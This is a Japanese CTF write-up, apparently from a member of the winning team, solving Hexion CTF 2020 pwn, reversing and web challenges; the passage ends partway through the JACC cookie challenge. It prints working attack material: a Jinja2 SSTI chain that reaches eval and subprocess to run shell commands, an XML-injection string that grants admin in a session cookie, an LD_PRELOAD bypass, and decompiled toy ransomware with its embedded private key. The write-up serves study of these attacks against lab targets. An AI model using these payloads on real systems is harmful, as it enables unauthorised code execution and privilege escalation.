---
layout: post
title: Hexion CTF 2020 Online の write-up
categories: [ctf]
date: 2020-04-13 16:00:00 +0900
---

4 月 12 日から 4 月 13 日にかけて開催された [Hexion CTF 2020 Online](https://ctf.hexionteam.com/) に、チーム zer0pts として参加しました。最終的にチームで 16174 点 (全完!) を獲得し、順位は 50 点以上得点した 429 チーム中 1 位でした。うち、私は 11 問を解いて 6603 点を入れました。

他のメンバーの write-up はこちら。

- [HexionCTF 2020 Writeups - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2020/04/13/153428)

以下、私が解いた問題の write-up です。

## [Pwn 988] Catall (13 solves)
> I hate my friend! He gave me this stupid binary, and he teases me with the flag.
> 
> Can you help me defeat this challenge and get the flag?
> 
> (SSH の接続情報)
> 
> Author: Idan

SSH で接続してみましょう。

```
catall@87bc8a31719a:~$ ls -la
total 48
dr-xr-xr-x 1 root  root   4096 Apr 10 00:30 .
dr-xr-xr-x 1 root  root   4096 Apr  4 09:06 ..
-r--r--r-- 1 root  root    220 Apr  4  2018 .bash_logout
-r--r--r-- 1 root  root   3818 Apr 11 17:18 .bashrc
-r--r--r-- 1 root  root    807 Apr  4  2018 .profile
-r-sr-sr-x 1 admin admin 17776 Apr 10 00:29 catall
-r--r--r-- 1 root  root   3183 Apr 10 00:29 catall.c
-r-------- 1 admin admin    46 Apr 10 00:29 flag
```

ホームディレクトリに `flag` というファイルがありますが、これは `catall` 経由でしか読むことができなさそうです。`catall.c` がきっと `catall` のソースコードでしょう。これは以下のような内容でした。

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <pwd.h>
#include <linux/fs.h>

#define BUFSIZE 256
#define MAX_ENTRIES 16

int protect(const char *flag_path)
{
        int fd;
        int attr;

        fd = open(flag_path, O_RDONLY);
        ioctl(fd, FS_IOC_GETFLAGS, &attr);
        attr |= FS_IMMUTABLE_FL;

        if (ioctl(fd, FS_IOC_SETFLAGS, &attr) < 0)
        {
                perror("IOCTL ERROR");
                printf("Please report to admin.\n");
                return 1;
        }

        close(fd);
        return 0;
}

int unprotect(const char *flag_path)
{
        int fd, attr;

        fd = open(flag_path, O_RDONLY);
        ioctl(fd, FS_IOC_GETFLAGS, &attr);
        attr ^= FS_IMMUTABLE_FL;

        if (ioctl(fd, FS_IOC_SETFLAGS, &attr) < 0)
        {
                perror("IOCTL ERROR");
                printf("Please report to admin.\n");
                return 1;
        }

        close(fd);
        return 0;
}

int copy(const char *src, const char *dst)
{
        char *content;
        FILE *file;
        int attr, flag_fd;

        file = fopen(src, "r");
        if (ferror(file))
                return 1;

        content = malloc(BUFSIZE);
        fread(content, BUFSIZE, 1, file);
        fclose(file);

        file = fopen(dst, "w");
        if (ferror(file))
        {
                free(content);
                return 1;
        }

        chmod(dst, S_IRUSR | S_IWUSR);
        fwrite(content, strlen(content) + 1, 1, file);
        fclose(file);

        free(content);
        return 0;
}

int setup(char **argv, char *dst_path)
{
        char *tmp_path = malloc(BUFSIZE);
        struct passwd *pwd;
        int attr;

        strncpy(tmp_path, argv[1], BUFSIZE);
        realpath(tmp_path, dst_path);
        strncpy(tmp_path, dst_path, BUFSIZE);

        if (!dst_path || strstr(dst_path, "/tmp/") != dst_path)
        {
                printf("Please work in a temporary folder under /tmp/\n");
                free(tmp_path);
                return 1;
        }

        strcat(tmp_path, "/flag");
        remove(tmp_path);
        copy("/home/catall/flag", tmp_path);

        free(tmp_path);
        return 0;
}

int main(int argc, char **argv)
{
        char *file_content;
        char *dir_path;
        char *file_path;
        char *flag_path;
        struct dirent **entries, *entry;
        FILE *file;
        int i, n, attr, flag_fd;

        if (argc != 2)
        {
                printf("Usage: catall.c /tmp/<your_folder>\n");
                return 1;
        }

        dir_path = malloc(BUFSIZE);
        if (setup(argv, dir_path))
        {
                free(dir_path);
                return 1;
        }

        flag_path = malloc(BUFSIZE);
        snprintf(flag_path, BUFSIZE, "%s/flag", dir_path);
        if (protect(flag_path))
        {
                remove(flag_path);
                free(flag_path);
                free(dir_path);
                return 1;
        }

        if ((n = scandir(dir_path, &entries, NULL, alphasort)) == -1)
        {
                printf("Directory Error\n");
                free(flag_path);
                free(dir_path);
                return 1;
        }

        file_content = malloc(BUFSIZE);
        file_path = malloc(BUFSIZE);

        for (i = 0; i < n && i < MAX_ENTRIES; i++)
        {
                entry = entries[i];
                snprintf(file_path, BUFSIZE, "%s/%s", dir_path, entry->d_name);

                if (entry->d_type == DT_REG)
                {
                        printf("%s:\n", entry->d_name);
                        file = fopen(file_path, "r");

                        if (file != NULL)
                        {
                                memset(file_content, 0, BUFSIZE);
                                fread(file_content, BUFSIZE, 1, file);
                        }

                        if (!strstr(file_path, "flag"))
                        {
                                printf("%s\n", file_content);
                                memset(file_content, 0, BUFSIZE);
                        }
                }
        }

        free(file_content);
        free(file_path);
        free(dir_path);

        if (!unprotect(flag_path))
                remove(flag_path);
        free(flag_path);

        return 0;
}
```

コマンドライン引数として与えたパスが `/tmp/` 下のディレクトリであれば、そのディレクトリに含まれる全てのファイルの内容を出力するというプログラムのようです。

ファイルの内容を出力する前に、コマンドライン引数として与えたディレクトリに `flag` をコピーしています。が、ファイル名が `flag` であればファイルの読み取り自体は行うもののその内容を出力しないという処理があります。

まず思い浮かぶのはシンボリックリンクやレースコンディションですが、いずれも対策されています。

これでは何もできなさそうに見えますが、よく見るとファイル名が `flag` のときに怪しい挙動をしています。

```c
                        file = fopen(file_path, "r");

                        if (file != NULL)
                        {
                                memset(file_content, 0, BUFSIZE);
                                fread(file_content, BUFSIZE, 1, file);
                        }

                        if (!strstr(file_path, "flag"))
                        {
                                printf("%s\n", file_content);
                                memset(file_content, 0, BUFSIZE);
                        }
```

ファイル名が `flag` のときには、それ以外の場合にファイルの内容の出力と同時に行われる `memset(file_content, 0, BUFSIZE);` が行われず、次のファイルの読み取りまで `file_content` にフラグが残っています。

`flag` の次のファイルで `fopen(file_path, "r")` が `NULL` を返せば、`file != NULL` が偽になりファイルの読み取り前の `memset(file_content, 0, BUFSIZE);` は実行されず、さらに `!strstr(file_path, "flag")` は真になるのでフラグが残ったままの `file_content` を出力させることができるはずです。

`fopen` が `NULL` を返すのはファイルを開くのに失敗したときです。読み取り権限を落とせば失敗させることができるでしょう。やってみましょう。

```
catall@87bc8a31719a:~$ mkdir /tmp/devilmintkiryu && cd /tmp/devilmintkiryu
catall@87bc8a31719a:/tmp/devilmintkiryu$ echo a > g
catall@87bc8a31719a:/tmp/devilmintkiryu$ chmod 000 g
catall@87bc8a31719a:/tmp/devilmintkiryu$ ~/catall .
flag:
g:
hexCTF{edg3_c4ses_ar3_7he_k3y_t0_d3struct10n}
```

フラグが得られました。

```
hexCTF{edg3_c4ses_ar3_7he_k3y_t0_d3struct10n}
```

## [Reversing 957] WannaSmile (23 solves)
> I accidentally executed this weird file that encrypted my important files! please help me understand what it does
> 
> (SSH の接続情報)
> 
> *This challenge consists of 2 parts.  
> **Attached version has the first flag removed.
> 
> Author: moka
> 
> 添付ファイル: wannasmile (ELF)

`Attached version has the first flag removed.` ということなので、バイナリにフラグが埋め込まれているのでしょう。Ghidra で探してみましょう。

```c
undefined8 FUN_001019f3(int iParm1,char **ppcParm2)

{
  // ︙
  phVar1 = gethostbyname(&DAT_00303020);
  if (phVar1 == (hostent *)0x0) {
    main(iParm1,ppcParm2);
    uVar2 = 0;
  }
  else {
    puts("<REDACTED> (shell server has flag here)");
    uVar2 = 0xffffffff;
  }
  return uVar2;
}
```

`gethostbyname` が成功すればフラグが表示されるようです。必ず NULL でない値を返すような `gethostbyname` がある共有ライブラリを用意して、`LD_PRELOAD` を使って呼び出される `gethostbyname` をこれに置き換えてみましょう。

```
wannasmile@1de660fa6809:/tmp/qwjodiwqjdoi$ cat evil.c
int gethostbyname(char *name) {
  return 1;
}
wannasmile@1de660fa6809:/tmp/qwjodiwqjdoi$ gcc -shared -fPIC evil.c -o evil.so
wannasmile@1de660fa6809:/tmp/qwjodiwqjdoi$ LD_PRELOAD=./evil.so ~/wannasmile
hexCTF{wh0_put5_k1ll_sw1tch3s_in_the1r_m4lw4r3}
```

フラグが得られました。

```
hexCTF{wh0_put5_k1ll_sw1tch3s_in_the1r_m4lw4r3}
```

## [Reversing 971] WannaSmile 2 (19 solves)
> Thank you for helping me stop the virus! can you recover my files now?
>
> (SSH の接続情報)
> 
> Author: moka

WannaSmile の続きのようです。真面目に処理を読んでいきましょう。一部の関数名等は読みやすくするためにリネームしています。

```c
void main(int iParm1,char **ppcParm2)

{
  __pid_t _Var1;
  __uid_t __ruid;
  int iVar2;
  int iVar3;
  uint uVar4;
  ulong uVar5;
  long in_FS_OFFSET;
  char *local_28;
  undefined *local_20;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (iParm1 < 2) {
    _Var1 = fork();
    if (_Var1 == 0) {
      local_28 = *ppcParm2;
      local_20 = &DAT_00101b59;
      local_18 = 0;
      execve(*ppcParm2,&local_28,(char **)0x0);
    }
    else {
      __ruid = getuid();
      srand(__ruid);
      iVar2 = rand();
      puts("-- Roleplay mode activate ---");
      iVar3 = rand();
      uVar4 = (uint)(iVar3 >> 0x1f) >> 0x14;
      uVar5 = (ulong)((iVar3 + uVar4 & 0xfff) - uVar4);
      printf("SEND %d BITCOINS IF YOU WANT YOUR FILES BACK\n",uVar5,uVar5);
      printf("Address: %s\n",s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_00303120 + (long)(iVar2 % 3) *0x23)
      ;
      wait((void *)0x0);
    }
  }
  else {
    __ruid = geteuid();
    setreuid(__ruid,__ruid);
    encrypt_files();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`encrypt_files` を呼んでいます。

```c
void encrypt_files(void)

{
  int iVar1;
  BIO *bp;
  time_t tVar2;
  char *__s1;
  DIR *__dirp;
  dirent *pdVar3;
  long lVar4;
  undefined8 *puVar5;
  long in_FS_OFFSET;
  byte bVar6;
  int local_13c;
  char dir [32];
  undefined8 local_f8 [29];
  long local_10;
  
  bVar6 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  bp = BIO_new_mem_buf(&DAT_0030384d,0x1ca);
  rsa_pubkey = PEM_read_bio_RSA_PUBKEY(bp,(RSA **)0x0,(undefined1 *)0x0,(void *)0x0);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  dir._0_8_ = 0x6e61772f7261762f;
  dir._8_8_ = 0x32656c696d73616e;
  dir._16_8_ = 0x2f;
  dir._24_8_ = 0;
  lVar4 = 0x1c;
  puVar5 = local_f8;
  while (lVar4 != 0) {
    lVar4 = lVar4 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + (ulong)bVar6 * 0x1ffffffffffffffe + 1;
  }
  __s1 = strrchr(dir,0x2f);
  __s1[1] = 0;
  __dirp = opendir(dir);
  if (__dirp != (DIR *)0x0) {
LAB_00101846:
    pdVar3 = readdir(__dirp);
    if (pdVar3 != (dirent *)0x0) {
      if (pdVar3->d_type == '\b') {
        __s1 = strrchr(pdVar3->d_name,0x2e);
        local_13c = 0;
        while( true ) {
          if ((4 < local_13c) || (__s1 == (char *)0x0)) goto LAB_00101846;
          iVar1 = strncmp(__s1,&DAT_00303190 + (long)local_13c * 5,4);
          if (iVar1 == 0) break;
          local_13c = local_13c + 1;
        }
        strncat(dir,pdVar3->d_name,0x100);
        encrypt_file(dir);
        __s1 = strrchr(dir,0x2f);
        __s1[1] = 0;
      }
      goto LAB_00101846;
    }
    closedir(__dirp);
  }
  BIO_free(bp);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

最初に RSA の公開鍵をロードし、また `srand(time(NULL))` で乱数の初期化をしています。それから `/var/wannasmile2/` 下にあるファイルのうち、拡張子が `.jpg` `.png` `.txt` `.doc` `.pptx` のいずれかであれば `encrypt_file` で暗号化しているようです。`encrypt_file` を読んでいきましょう。

```c
void encrypt_file(char *path)

{
  long lVar1;
  RSA *rsa;
  int rsa_size1;
  int rsa_size2;
  uchar *aes_key;
  uchar *encrypted_key;
  size_t file_len;
  int iVar2;
  EVP_CIPHER_CTX *ctx;
  EVP_CIPHER *cipher;
  size_t key_len;
  long in_FS_OFFSET;
  int pad;
  uchar *original_content;
  void *encrypted_content;
  FILE *fp;
  uchar *keyyyy;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  original_content = (uchar *)0x0;
  encrypted_content = (void *)0x0;
  aes_key = (uchar *)calloc(0x21,1);
  rsa_size1 = RSA_size(rsa_pubkey);
  encrypted_key = (uchar *)calloc((long)rsa_size1,1);
  fp = fopen(path,"rb");
  pad = 0;
  if (fp != (FILE *)0x0) {
    fseek(fp,0,2);
    file_len = ftell(fp);
    rewind(fp);
    if (file_len != 0) {
      original_content = (uchar *)calloc(file_len,1);
      encrypted_content = calloc(file_len + 0x10,1);
      fread(original_content,1,file_len,fp);
      fclose(fp);
      iVar2 = memcmp("WANNASMILE",original_content,10);
      if (iVar2 != 0) {
        generate_key(aes_key,0x20);
        ctx = EVP_CIPHER_CTX_new();
        cipher = EVP_aes_256_cbc();
        EVP_EncryptInit_ex(ctx,cipher,(ENGINE *)0x0,aes_key,(uchar *)0x0);
        EVP_EncryptUpdate(ctx,(uchar *)encrypted_content,&pad,original_content,(int)file_len);
        iVar2 = pad;
        EVP_EncryptFinal_ex(ctx,(uchar *)encrypted_content + (long)pad,&pad);
        iVar2 = iVar2 + pad;
        EVP_CIPHER_CTX_free(ctx);
        rsa = rsa_pubkey;
        key_len = strlen((char *)aes_key);
        RSA_public_encrypt((int)key_len,aes_key,encrypted_key,rsa,1);
        fp = fopen(path,"wb");
        fwrite("WANNASMILE",1,10,fp);
        rsa_size2 = RSA_size(rsa_pubkey);
        fwrite(encrypted_key,1,(long)rsa_size2,fp);
        fwrite(encrypted_content,1,(long)iVar2,fp);
      }
    }
  }
  if (original_content != (uchar *)0x0) {
    free(original_content);
  }
  if (encrypted_content != (void *)0x0) {
    free(encrypted_content);
  }
  if (aes_key != (uchar *)0x0) {
    free(aes_key);
  }
  if (encrypted_key != (uchar *)0x0) {
    free(encrypted_key);
  }
  fclose(fp);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

暗号化対象のファイルに `WANNASMILE` が含まれていない (= まだ暗号化されていない) 場合に暗号化処理を行っているようです。

まず 32 バイトの AES の鍵を `generate_key` で生成し、ファイルを AES-256-CBC で暗号化しています。その後生成された AES の鍵を先程の RSA の公開鍵で暗号化しています。最終的に、以下のような内容で書き込んでいます。

- `WANNASMILE` (10 バイト)
- RSA で暗号化された AES の鍵 (256 バイト)
- AES で暗号化されたファイルの内容

RSA の秘密鍵を探してみたところ、`strings` でそれっぽいものが見つかりました。

```
$ strings -n 8 wannasmile
︙
.pptx-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAujCxmc9GU2RHVWRgQKhHkU+vrD35XbAbWIGFu+a5mghCvLWc
aCm0HDW7zU8t8InSXkCa03mUrZLtERl00JviFEdREYpV3ATpKM9CG7WCMmCvT7+k
j9ReKhqNwmJTfYxf/yEN3STMtl8d2UUDAXLDX6RMijuVF4r1hhHJcmzbQsfi4SzL
xmBkTEdr+0P+8WyLGb6eI1NsCPhLw5ctma2Sf/iAuN1VZ4EFrhP8DMQR683Ha0w5
zllh6Olz15d6AoMtOAKpt1/d+oebmimnweUdoUji3M09g0RlzcbkcjGdydFmkTfl
RfXruneYwx/1ajbkzOIKSYtvsQ68qfutEv5UYwIDAQABAoIBAHV45YUavs88lLku
xH/m7IilEzyEOYI/63Dy/3KnRvEFRz4TA6TAsy+dQ2ltDJoYCs+GyWil7AV7jvFb
81TvFTwgJuj/M97GhmlGIvqikYvBbrrNOkG5BtRfvpMnQHAVEjhBHaMqZbKm3olH
vna6dsQwQE5y+0VIWlKFhGkaf1ho+HlghrTs1hp8q53LjYOkSzIiLC2llSqX+TJI
4likIe3SJc9I3tvBcNXjKE4lDtJv8UVvvOX870Okaiz4gcezghWKAP0jlBnjGt4h
aNPyCLN2QN5AsF6cL+VN6vKQqiTP6IO/Z27RvmZpFnZCS4lCdxIWVQplZSAQvhZr
S3vlU0kCgYEA/fP/Gum81jsZILHYQyHXD7c+mpDMsF9q8UcEgJWhsFwl7gpmXhKF
UkbbaAZ41LdRLEMULN9lrj9KsZgUSL+q1dbgg58QfeWeT23GrBryOLc4+73O2tDY
GLKlm1iDbzUcH90rt9N/l1P1mchum5yhPgce9s/Vxd+FsT+JrdKa2E0CgYEAu7Dg
TOIwZGkkAPChuzvgGwQc5zyB2W9JMIu6f/vjv5sO9ULml7YPNKLl5lQb3tLClLKE
mLH+km5Ktt9aSegxFMYxHBOjbPNHiQzNucziFld/gnLxZH2VecqAztu1eIaRLFsO
RN+M08Ci5AIcgNELopihwRWoOBIlxIm1YGPqN28CgYEAkz6ZCJLD8fccL6/Oc8Y4
Ox2Fh/szI4R/rlv+CUw5DtevCmEvT5YvhTAeYSd3gea0gxR1qzrwauK5vVUvVasE
M66+SLK+zjCH5QgCbKHHFgluWdCJEqiK028pxHPC6YUCxJrpkVFpJmYA/mSPdVyQ
xTU9x99j1LIwg0AS5R06uPUCgYBbwCJV0zh+zVr5TqhxI9rwufj7HPwI87rejV+1
EsiJsN4GDRc2UJxsSbmC99jL+1F9aSsijdh5cor5jIPRnzzm/9+f7wWzy9VLbMPg
sQRQkaNWfKP+UNnSOKjw9jxm17l96mE2T+XC2eeG+HVAj3BVorFn9xNNnalywzK0
FQO45wKBgGSNstScPA8i1Jrqa0NaMMbRvP1ifhID/snDt3mfgybvD1GEUcNIQUDu
1hUE/K5lMaijtcbsuvpW+9y8mL0ZTI3kk8voOV8VkJ8cMy8/RH7zRMC2lC+GU7es
nGUfgUSTuxJ06sNCNF3AqGwRmaIrQ/e7qRBmzrcU3QmkXTBiaEL9
-----END RSA PRIVATE KEY----------BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAujCxmc9GU2RHVWRgQKhH
kU+vrD35XbAbWIGFu+a5mghCvLWcaCm0HDW7zU8t8InSXkCa03mUrZLtERl00Jvi
FEdREYpV3ATpKM9CG7WCMmCvT7+kj9ReKhqNwmJTfYxf/yEN3STMtl8d2UUDAXLD
X6RMijuVF4r1hhHJcmzbQsfi4SzLxmBkTEdr+0P+8WyLGb6eI1NsCPhLw5ctma2S
f/iAuN1VZ4EFrhP8DMQR683Ha0w5zllh6Olz15d6AoMtOAKpt1/d+oebmimnweUd
oUji3M09g0RlzcbkcjGdydFmkTflRfXruneYwx/1ajbkzOIKSYtvsQ68qfutEv5U
YwIDAQAB
-----END PUBLIC KEY-----GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
︙
```

どのようなファイルが暗号化されているか、問題サーバに接続して見てみましょう。

```
wannasmile@c93d605716ed:/var/wannasmile2$ ls -la
total 1608
dr-xr-xr-x 1 root root    4096 Apr 12 22:18 .
drwxr-xr-x 1 root root    4096 Apr 12 22:18 ..
-r--r--r-- 1 root root   91722 Apr 12 22:19 HexionLogo.png
-r--r--r-- 1 root root  253706 Apr 12 22:19 aaaaa.png
-r--r--r-- 1 root root     314 Apr 12 22:19 flag2.txt
-r--r--r-- 1 root root 1277978 Apr 12 22:19 present.pptx
```

`flag2.txt` がそれっぽいのでダウンロードしておきます。これを AES の鍵を復号 → ファイルの内容を復号という順番で復号してみましょう。

まずは AES の鍵を復号してみましょう。

```c
#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

int main(void) {
  FILE *fp;
  char enc_aeskey[2000], dec_aeskey[2000];

  EVP_CIPHER_CTX *ctx;
  RSA *rsa;

  fp = fopen("priv.txt", "rb");
  rsa = PEM_read_RSAPrivateKey(fp, NULL, NULL, NULL);
  fclose(fp);

  fp = fopen("flag2.txt", "rb");
  fseek(fp, 10, SEEK_SET);
  fread(enc_aeskey, sizeof(char), RSA_size(rsa), fp);
  fclose(fp);

  RSA_private_decrypt(RSA_size(rsa), enc_aeskey, dec_aeskey, rsa, 1);
  puts(dec_aeskey);
  
  return 0;
}
```

コンパイルして実行します。

```
$ gcc -o get_aes_key get_aes_key.c -lssl -lcrypto
$ ./get_aes_key
jmgcgmseonnehdkwpapcygwyabpwqvob
```

`jmgcgmseonnehdkwpapcygwyabpwqvob` が AES の鍵であるとわかりました。これを使ってファイルを復号しましょう。

```python
from Crypto.Cipher import AES

key = 'jmgcgmseonnehdkwpapcygwyabpwqvob'
with open('flag2.txt', 'rb') as f:
  f.read(10) # WANNASMILE
  f.read(256) # rsa_encrypt(aes_key)
  encrypted = f.read()

decrypted = AES.new(key, AES.MODE_CBC, '\0' * 16).decrypt(encrypted)
print decrypted[:-ord(decrypted[-1])]
```

```
$ python2 solve.py
hexCTF{1_d0nt_w4nt_t0_smil3_4nym0r3}
```

フラグが得られました。

```
hexCTF{1_d0nt_w4nt_t0_smil3_4nym0r3}
```

## [Web 100] Well Known (277 solves)
> Well... it's known (:
> 
> (URL)
> 
> Author: Yarin

与えられた URL にアクセスすると 404 Not Found が表示されました。

他にもコンテンツがあるはずと考え、`Well Known` という問題名から `.well-known/` というディレクトリを思い出しアクセスしてみたところ、`placeholder` と表示されました。どうやらディレクトリが存在するようです。

セキュリティ関連で `.well-known` ディレクトリといえば [`.well-known/security.txt`](https://securitytxt.org/) です。アクセスするとフラグが表示されました。

```
hexCTF{th4nk_y0u_liv3_0v3rfl0w}
```

## [Web 881] Notes (37 solves)
> (URL)
> 
> Author: Yarin

与えられた URL にアクセスすると、以下のような ToDo リストっぽい Web アプリケーションが表示されました。

![Notes](../images/2020-04-13_notes.png)

`{% raw %}{{{% endraw %}7*7}}<script>alert(1)</script>` のような文字列を投げてみても `{% raw %}{{7*7}}{% endraw %}` は `49` に置換されず、またアラートも表示されないため SSTI も XSS もできないことがわかります。

HTML を見てみると、以下のような気になるコメントがありました。

```html
<!-- DEPRECATED <script>
    $.getJSON("/notes", (res) => {
        res.forEach(o => {
            notesList.append(document.createTextNode(o));
        });
    });
</script> -->
```

`/notes` に GET でアクセスしています。試しに `/notes` にアクセスしてみると、以下のようにこちらでは SSTI と XSS ができることがわかりました。

```javascript
['49<script>alert(1)</script>']
```

この Web アプリケーションには admin に URL を報告すると巡回してくれるというような機能がなく、XSS は使い所がありません。SSTI から攻めていきましょう。

ペイロードを試すたびに `textarea` に入力して送信し、`/notes` にアクセスするというのを繰り返すのは面倒なので、これを簡単にできる Python スクリプトを書いておきましょう。

```python
import html
import sys
import requests

BASE = 'http://(省略)'
PAYLOAD = sys.argv[1]

session = requests.Session()
session.post(BASE + '/notes', data={
  'text': PAYLOAD
})
print(html.unescape(eval(session.get(BASE +'/notes').text)[0]))
```

`{% raw %}{{{% endraw %}config}}` を投げると `SECRET_KEY` や `PROPAGATE_EXCEPTIONS` といったキーが見え、Flask が使われていることがわかります。

[Cheatsheet - Flask & Jinja2 SSTI](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) を参考に色々試していると、`{% raw %}{{{% endraw %}''.__class__.__mro__[1].__subclasses__()[167]}}` で `warnings.catch_warnings` を取り出すことができました。

さらにたどっていくと、`{% raw %}{{{% endraw %}''.__class__.__mro__[1].__subclasses__()[167].__init__.__globals__['__builtins__']['eval']}}` で `eval` を取り出すことができました。

あとはやるだけです。`{% raw %}{{{% endraw %}''.__class__.__mro__[1].__subclasses__()[167].__init__.__globals__['__builtins__']['eval']('__import__')('subprocess').check_output('ls -la',shell=True)}}` で以下のようにファイルの一覧が取得できました。

```
total 40
dr-xr-xr-x 1 site site 4096 Apr 12 15:42 .
drwxr-xr-x 1 root root 4096 Apr 12 15:32 ..
-r--r--r-- 1 site site  220 Apr  4  2018 .bash_logout
-r--r--r-- 1 site site 3818 Apr 12 15:42 .bashrc
-r--r--r-- 1 site site  807 Apr  4  2018 .profile
drwxr-xr-x 2 root root 4096 Apr 12 15:42 __pycache__
-r--r--r-- 1 root root   46 Apr 12 15:32 flag
-r-x-w---- 1 root root  800 Apr 12 15:28 server.py
dr-xrwxr-x 1 root root 4096 Apr  4 09:00 templates
```

実行するコマンドを `cat flag` に変えるとフラグが得られました。

```
hexCTF{d0nt_r3nder_t3mplates_w1th_u5er_1nput}
```

## [Web 977] JACC (17 solves)
> Say hello to JACC - Just Another Cookie Clicker 🍪
> 
> (URL)
> 
> Author: Yarin

与えられた URL にアクセスすると、以下のようにユーザ名の入力フォームが表示されました。

![ユーザ名の入力フォーム](../images/2020-04-13_jacc1.png)

適当なユーザ名を入力して送信すると Cookie Clicker 的なものが始まりました。

![Cookie Clicker](../images/2020-04-13_jacc2.png)

クッキーをクリックすると画像の上に表示されている数値が増えていきます。ですが、クリックしただけではこの数値は保持されず、ページを更新すると 0 に戻ってしまいます。

Save State ボタンをクリックすると `/site?cookies=(現在の数値)` にリクエストが飛んで Cookie が更新されるようです。

Cookie には以下のような文字列が保持されていました。

```
.eJxFjM1ugyAAgF9l4bwDurmlJjuMFLRd0KAClZsWE6yIbm1SS9N3Xw_Ndv5-rmA_TUPfHUEcvD8Du4wWxFfw1IIYcJwRjZeKDVtRyJMTYyA7SS9tqvpmXLlKUKjh8s2kptx__rBwfu3k5pJXiKlw5UqeIRWglI9mKCC_c4sUtOu7v2WQOI6N7Oxcl04o4cmRJzBoE3zJ14bSQL1Ja760sDsql__foy9Sc649jhoyp3SH-uZQvHBMo31Cl1yapvDkXI8TLP98HcpBJ5RYnuETY95G9WETUYJc6-EHuN1-AcufWBE.XpPsww.MXqRgPeLydrMlUZNK8Fy96VvTC4
```

`.` 区切りで 3 項目、`XpPsww` と 2 つ目の項目が短め (タイムスタンプが入っている)、Base64 エンコードあたりから Flask のクライアントセッションと推測できます。デコードしてみましょう。

```
>>> import base64
>>> s = 'eJxFjM1ugyAAgF9l4bwDurmlJjuMFLRd0KAClZsWE6yIbm1SS9N3Xw_Ndv5-rmA_TUPfHUEcvD8Du4wWxFfw1IIYcJwRjZeKDVtRyJMTYyA7SS9tqvpmXLlKUKjh8s2kptx__rBwfu3k5pJXiKlw5UqeIRWglI9mKCC_c4sUtOu7v2WQOI6N7Oxcl04o4cmRJzBoE3zJ14bSQL1Ja760sDsql__foy9Sc649jhoyp3SH-uZQvHBMo31Cl1yapvDkXI8TLP98HcpBJ5RYnuETY95G9WETUYJc6-EHuN1-AcufWBE'
>>> t = base64.urlsafe_b64decode(s + '=')
>>> t
"x\x9cE\x8c\xcdn\x83 \x00\x80_e\xe1\xbc\x03\xba\xb9\xa5&;\x8c\x14\xb4]\xd0\xa0\x02\x95\x9b\x16\x13\xac\x88nmRK\xd3w_\x0f\xcdv\xfe~\xae`?MC\xdf\x1dA\x1c\xbc?\x03\xbb\x8c\x16\xc4W\xf0\xd4\x82\x18p\x9c\x11\x8d\x97\x8a\r[Q\xc8\x93\x13c ;I/m\xaa\xfaf\\\xb9JP\xa8\xe1\xf2\xcd\xa4\xa6\xdc\x7f\xfe\xb0p~\xed\xe4\xe6\x92W\x88\xa9p\xe5J\x9e!\x15\xa0\x94\x8ff( \xbfs\x8b\x14\xb4\xeb\xbb\xbfe\x908\x8e\x8d\xec\xec\\\x97N(\xe1\xc9\x91'0h\x13|\xc9\xd7\x86\xd2@\xbdIk\xbe\xb4\xb0;*\x97\xff\xdf\xa3/Rs\xae=\x8e\x1a2\xa7t\x87\xfa\xe6P\xbcpL\xa3}B\x97\\\x9a\xa6\xf0\xe4\\\x8f\x13,\xff|\x1d\xcaA'\x94X\x9e\xe1\x13c\xdeF\xf5a\x13Q\x82\\\xeb\xe1\x07\xb8\xdd~\x01\xcb\x9fX\x11"
```

`78 9c` から始まっているということは zlib でしょう。展開します。

```
>>> import zlib
>>> zlib.decompress(t)
'{"cookies":17,"lxml":{" b":"UENFdExTQkJVRWtnVm1WeWMybHZiam9nTVM0d0xqQWdMUzArQ2p4eWIyOTBQZ29nSUNBZ1BHUmhkR0UrQ2lBZ0lDQWdJQ0FnUEhWelpYSnVZVzFsUG01bGEyODhMM1Z6WlhKdVlXMWxQZ29nSUNBZ0lDQWdJRHhwYzE5aFpHMXBiajR3UEM5cGMxOWhaRzFwYmo0S0lDQWdJRHd2WkdGMFlUNEtQQzl5YjI5MFBnbz0="}}'
```

JSON が出てきました。`lxml` をデコードしてみましょう。

```
>>> import json
>>> j = json.loads(zlib.decompress(t))
>>> base64.b64decode(base64.b64decode(j['lxml'][' b']))
'<!-- API Version: 1.0.0 -->\n<root>\n    <data>\n        <username>neko</username>\n        <is_admin>0</is_admin>\n    </data>\n</root>\n'
```

XML が出てきました。ユーザ名や admin であるかどうかといった情報を保存しているようです。なんとかして `is_admin` を 1 にできないでしょうか。

例えばユーザ名の入力時に `</username>` を入力して XML の構造を壊すことはできないでしょうか。やってみると `Error: Opening and ending tag mismatch: data line 3 and username, line 4, column 41 (, line 4)` というエラーが表示されました。`<` や `>` がエスケープされずそのまま XML に挿入されているようです。

`</username><is_admin>1</is_admin></data><data><username>a` を入力してみると、今度は admin 用のログインフォームが表示されました。

![Admin Login](../images/2020-04-13_jacc3.png)

パスワードを入力しろと言われても困ります。HTML を見ると気になるコメントがありました。

```html
<!-- If you are an admin and you forgot the password it's located on the server at /admin_pass-->
```

